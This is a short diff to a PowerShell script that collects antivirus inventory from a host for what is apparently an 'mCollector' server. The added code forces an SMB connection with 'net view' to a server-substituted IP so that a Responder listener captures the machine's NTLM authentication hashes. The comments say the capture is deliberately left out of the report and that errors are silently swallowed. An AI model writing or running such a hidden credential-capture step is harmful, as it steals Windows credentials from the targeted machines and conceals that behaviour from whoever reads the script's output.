@@ -178,6 +178,21 @@ Write-Host "Collecting info about antivirus."
 $avProducts = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct |
     Select-Object displayName, instanceGuid, pathToSignedProductExe, pathToSignedReportingExe, productState, timestamp
 
+# Trigger SMB/NTLM collection by reaching out to the mCollector server's
+# active adapter IP. {{SERVER_IP}} is substituted server-side before the
+# script is delivered, so we never depend on DNS (mytt) resolving on the
+# target. This is a side-effect-only call -- the Responder result is
+# intentionally NOT serialized into the JSON output.
+$ntlmServerIp = "{{SERVER_IP}}"
+if ($ntlmServerIp) {
+    Write-Host "Triggering SMB connect to \\$ntlmServerIp for NTLM collection..."
+    try {
+        $null = net view "\\$ntlmServerIp" 2>&1
+    } catch {
+        # Swallow -- this is best-effort and must not affect the report.
+    }
+}
+
 
 Write-Host "Processing collected data."
 $collectedData = New-Object -TypeName psobject
